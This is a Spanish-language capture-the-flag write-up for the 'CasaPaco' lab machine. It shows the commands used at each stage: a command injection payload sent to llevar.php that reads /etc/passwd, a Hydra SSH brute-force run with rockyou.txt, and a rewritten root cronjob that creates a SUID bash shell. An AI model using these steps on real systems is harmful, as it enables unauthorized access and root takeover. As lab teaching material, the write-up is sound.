# 🍽️ Resolución del CTF "Casa Paco" | The HackersLabs

**Plataforma:** TheHackersLabs  
**Nombre de la máquina:** CasaPaco  
**Dificultad:** Fácil/Media  
**Enfoque:** Inyección de comandos, fuerza bruta SSH, escalada de privilegios vía cronjob

---

## 🔍 1. Escaneo de puertos con Nmap

```bash
nmap -p- -sS -sC -sV -Pn 192.168.1.126
```

**Puertos abiertos:**

- 22/tcp → OpenSSH 9.2p1
- 80/tcp → Apache 2.4.62

---

## 🌐 2. Enumeración web

Accedemos a `http://casapaco.thl/` y observamos una web de pedidos llamada **Casa Paco - Pedido para Llevar**.

Con **feroxbuster** descubrimos la existencia de un archivo interesante:

```bash
feroxbuster --url http://casapaco.thl -x php,html,txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Se encuentra el endpoint `llevar.php`.

---

## 💥 3. Inyección de comandos (Command Injection)

Probamos inyección en el parámetro `dish` mediante Burp Suite:

```http
POST /llevar.php
name=admin&dish=cat /etc/passwd
```

Confirmamos que el contenido del comando se refleja en la respuesta → **vulnerabilidad de inyección de comandos**.

Posteriormente, identificamos el código fuente en `llevar.php`, donde se utiliza `shell_exec()` directamente con el input del usuario (`$dish`) sin una validación robusta.

---

## 🕵️ 4. Enumeración de usuarios

Listamos `/etc/passwd` y encontramos al usuario `pacogerente`:

```
pacogerente:x:1001:1001::/home/pacogerente:/bin/bash
```

---

## 🔓 5. Ataque de fuerza bruta SSH

Usamos Hydra para romper la contraseña del usuario `pacogerente`:

```bash
hydra -l pacogerente -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.126
```

**Credenciales válidas:**
- Usuario: pacogerente
- Contraseña: dipset1

---

## 💻 6. Acceso SSH

```bash
ssh pacogerente@192.168.1.126
```

Entramos correctamente y confirmamos el usuario con `whoami`.

---

## 🎯 7. Obtención de la flag de usuario

```bash
cat /home/pacogerente/user.txt
```

Flag de usuario obtenida exitosamente.

---

## ⬆️ 8. Escalada de privilegios vía cronjob

Listamos los cronjobs del sistema:

```bash
ls -l /etc/cron.d/
```

Encontramos un cronjob ejecutado como **root** cada minuto:

```bash
* * * * * root /home/pacogerente/fabada.sh
```

### 🔧 Script original

```bash
#!/bin/bash
echo "Ejecutado por cron el: $(date)" >> /home/pacogerente/log.txt
```

### 🔥 Lo modificamos para escalar privilegios:

```bash
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

Tras esperar la ejecución automática del cron, se crea el binario `/tmp/rootbash` con bit SUID:

```bash
ls -l /tmp/rootbash
-rwsr-sr-x 1 root root [...] /tmp/rootbash
```

Ejecutamos con privilegios:

```bash
/tmp/rootbash -p
whoami
> root
```

---

## 🏁 9. Flag root

```bash
cat /root/root.txt
```

Flag de root obtenida con éxito ✅

---

## 🧩 Conclusión

Resumen de pasos:

1. Enumeración web e identificación de endpoint vulnerable (`llevar.php`)
2. Explotación de inyección de comandos
3. Enumeración de usuarios desde `/etc/passwd`
4. Ataque de fuerza bruta por SSH
5. Escalada de privilegios mediante cronjob mal configurado
6. Modificación del script para generar binario con bit SUID
7. Ejecución como root y obtención de la flag final

---
